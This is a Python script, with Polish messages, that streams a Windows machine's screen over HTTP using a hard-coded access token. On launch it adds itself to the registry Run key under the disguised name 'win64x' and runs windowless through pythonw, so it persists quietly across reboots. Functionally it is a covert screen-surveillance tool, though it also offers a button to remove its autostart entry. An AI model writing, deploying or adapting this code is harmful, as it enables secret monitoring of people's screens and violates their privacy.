import asyncio
import json
import mss
import cv2
import numpy as np
from aiohttp import web
from aiohttp.client_exceptions import ClientConnectionResetError
import os
import sys
import winreg as reg


config = {"port": 8080, "token": "IJxVvsW9fJpjzLeHricMdY", "fps": 15, "quality": 50, "monitor_id": 1}

APP_NAME = "win64x"
REG_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

def add_to_registry_startup():
    script_path = os.path.abspath(sys.argv[0])
    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
    command = f'"{pythonw_path}" "{script_path}"'
    
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_KEY_PATH, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, APP_NAME, 0, reg.REG_SZ, command)
        reg.CloseKey(key)
        print(f"Skrypt dodany.")
    except Exception as e:
        print(f"Błąd podczas dodawania: {e}")

def remove_from_registry_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_KEY_PATH, 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, APP_NAME)
        reg.CloseKey(key)
        print(f"Usunięto wpis '{APP_NAME}'.") #Z R
        return True
    except FileNotFoundError:
        print(f"Wpis '{APP_NAME}' nie istnieje.")
        return False
    except Exception as e:
        print(f"Błąd podczas usuwania: {e}")
        return False

async def delete_startup(request):
    if request.query.get('token') != config["token"]:
        return web.json_response({"success": False, "message": "Nieprawidłowy token."}, status=403)
    
    success = remove_from_registry_startup()

    if success:
        return web.json_response({"success": True, "message": "Aplikacja usunięta z autostartu! Przy następnym restarcie nie włączy się."}, status=200)
    else:
        return web.json_response({"success": False, "message": "Błąd: Wpis nie został znaleziony."}, status=500)

async def generate_frames(monitor_id: int):
    sct = mss.mss()
    monitor_index = 1 
    
    if monitor_id >= len(sct.monitors) or monitor_id < 0:
        print(f"Monitor o ID {monitor_id} nie istnieje. Użyto domyślnego: Monitor 1.")
        monitor_index = 1
    else:
        monitor_index = monitor_id
        
    monitor = sct.monitors[monitor_index]
    
    while True:
        img = np.array(sct.grab(monitor))[:, :, :3]
        img = cv2.resize(img, (1280, 720))
        _, jpeg = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, config["quality"]])
        yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + jpeg.tobytes() + b'\r\n')
        await asyncio.sleep(1 / config["fps"])

async def video_feed(request):
    if request.query.get('token') != config["token"]:
        return web.Response(text='Nieprawidłowy token', status=403)
    
    monitor_param = request.query.get('monitor', '1')
    requested_monitor_id = 1
    
    try:
        requested_monitor_id = int(monitor_param)
    except ValueError:
        requested_monitor_id = 1
    
    response = web.StreamResponse()
    response.content_type = 'multipart/x-mixed-replace; boundary=frame'
    await response.prepare(request)
    
    try:
        async for frame in generate_frames(requested_monitor_id):
            await response.write(frame)
    except ClientConnectionResetError:
        pass
    except Exception as e:
        print(f"Błąd transmisji: {e}")
        return web.Response(text='Błąd transmisji.', status=500)

    return response

async def index(request):
    if request.query.get('token') != config["token"]:
        return web.Response(text='Nieprawidłowy token', status=403)
    
    monitor_param = request.query.get('monitor', '1')
    
    AUTH_TOKEN = config["token"]
    
    html = f'''<!DOCTYPE html>
<html><head><title>Screen Share</title>
<style>body{{margin:0;background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh}}
img{{max-width:90%;max-height:80vh}}
button{{margin-top: 15px; padding: 10px 20px; background-color: #f44336; color: white; border: none; cursor: pointer; border-radius: 5px;}}
#status{{color: #fff; margin-top: 10px;}}
</style></head>
<body>
    <img src="/stream?token={AUTH_TOKEN}&monitor={monitor_param}" alt="Screen">
    
    <button onclick="removeApp()">Usuń Aplikację z Autostartu</button>
    <p id="status"></p>

    <script>
        // TOKEN JEST TERAZ JAWNIE POBIERANY Z PYTHONOWEJ ZMIENNEJ W SERWERZE
        const TOKEN = '{AUTH_TOKEN}'; 

        ''''''function removeApp() {
            // Używamy zmiennej TOKEN
            const url = `/delete_startup?token=${TOKEN}`; 

            document.getElementById('status').innerText = 'Wysyłanie żądania...';

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    document.getElementById('status').innerText = "Status: " + data.message;
                })
                .catch(error => {
                    document.getElementById('status').innerText = 'Błąd komunikacji z serwerem. Sprawdź konsolę.';
                });
        }
    </script>
</body></html>'''
    return web.Response(text=html, content_type='text/html')

app = web.Application()
app.router.add_get('/view', index)
app.router.add_get('/stream', video_feed)
app.router.add_get('/delete_startup', delete_startup) 

if __name__ == '__main__':
    add_to_registry_startup()
    
    print(f"http://localhost:{config['port']}/view?token={config['token']}&monitor=1")
    
    web.run_app(app, port=config["port"])